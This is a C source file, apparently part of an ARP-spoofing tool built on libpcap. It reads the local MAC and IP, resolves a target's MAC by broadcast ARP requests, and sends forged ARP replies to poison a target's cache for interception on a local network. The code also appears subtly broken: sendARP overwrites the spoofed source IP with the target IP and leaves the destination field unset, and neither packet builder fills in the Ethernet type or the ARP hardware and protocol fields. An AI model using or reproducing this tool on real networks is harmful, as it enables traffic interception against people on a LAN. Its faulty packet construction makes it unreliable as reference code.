#include "arp_spoof.h"

void getMacAddr(struct Address *addr, const char *inf) {
	int s;
	struct ifreq ifr;
	assert((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) >= 0, "Failed to open socket in getMacAddr");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", inf);

	assert(ioctl(s, SIOCGIFHWADDR, &ifr) >= 0, "Failed to get Mac Address in getMacAddr");
	close(s);

	memcpy(addr->MAC, ifr.ifr_hwaddr.sa_data, 6);
}

void getIpAddr(struct Address *addr, const char *inf) {
	int s;
	struct ifreq ifr;
	assert((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) >= 0, "Failed to open socket in getIpAddr");

	memset(&ifr, 0, sizeof(ifr));
	ifr.ifr_addr.sa_family = AF_INET;
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", inf);

	assert(ioctl(s, SIOCGIFADDR, &ifr) >= 0, "Failed to get IP Address in getIpAddr");
	close(s);

	memcpy(addr->IP, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 4);
}

int load(pcap_t *hd, struct pcap_pkthdr **h, const u_char **p) {
	int res;
	while(!(res = pcap_next_ex(hd, h, p)));
	return res > 0;
}

int isARP(const u_char *p) {
	return p[12] == 0x08 && p[13] == 0x06;
}

void getHWaddr(pcap_t *handle, struct Address *target, struct Address *sender) {
	 
	uint8_t MAC_broad[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	const u_char *raw;
	struct pcap_pkthdr* header;

	struct ARPPacket packet;
	memcpy(packet.MAC_source, sender->MAC, 6);
	memcpy(packet.MAC_destin, MAC_broad, 6);
	packet.operation = htons(1);
	memcpy(packet.hwAddr_source, sender->MAC, 6);
	memcpy(packet.hwAddr_destin, MAC_broad, 6);
	memcpy(packet.ptAddr_source, sender->IP, 4);
	memcpy(packet.ptAddr_destin, target->IP, 4);

	struct ARPPacket *reply = &packet;

	int ntry = 10;
	int timeout = 0;

	while( !((!memcmp(reply->MAC_destin, sender->MAC, 6)) &&
		ntohs(reply->etherType) == 0x0806 &&
		ntohs(reply->operation) == 0x0002 &&
		(!memcmp(reply->ptAddr_source, target->IP, 4)) &&
		(!memcmp(reply->ptAddr_destin, sender->IP, 4)) &&
		(!memcmp(reply->hwAddr_destin, sender->MAC, 6)))) {
		
		if (!timeout--) {
			assert(ntry--, "ARP protocol faeild. check sender/target IP addresses.");

			timeout = 10;
			pcap_sendpacket(handle, (u_char *)&packet, sizeof(packet));

		}
		assert(load(handle, &header, &raw), "packet loading failed");
		reply = (struct ARPPacket *)raw;
	}

	memcpy(target->MAC, reply->MAC_source, 6);
}

void sendARP(pcap_t *handle, struct spoofTarget *s, struct Address *fake) {
	struct ARPPacket packet;
	memcpy(packet.MAC_source, s->sender.MAC, 6);
	memcpy(packet.MAC_destin, s->target.MAC, 6);
	packet.operation = htons(2);
	memcpy(packet.hwAddr_source, s->sender.MAC, 6);
	memcpy(packet.hwAddr_destin, s->target.MAC, 6);
	memcpy(packet.ptAddr_source, fake->IP, 4);
	memcpy(packet.ptAddr_source, s->target.IP, 4);

	pcap_sendpacket(handle, (u_char *)&packet, sizeof(packet));
}

void printMac(struct Address *p) {
	for (int i = 0 ; i < 6 ; i++) {
		if(i) printf(":");
		printf("%02X", p->MAC[i]);
	}
}

void printIp(struct Address *p) {
	for (int i = 0 ; i < 4 ; i++) {
		if(i) printf(".");
		printf("%d", p->IP[i]);
	}
}



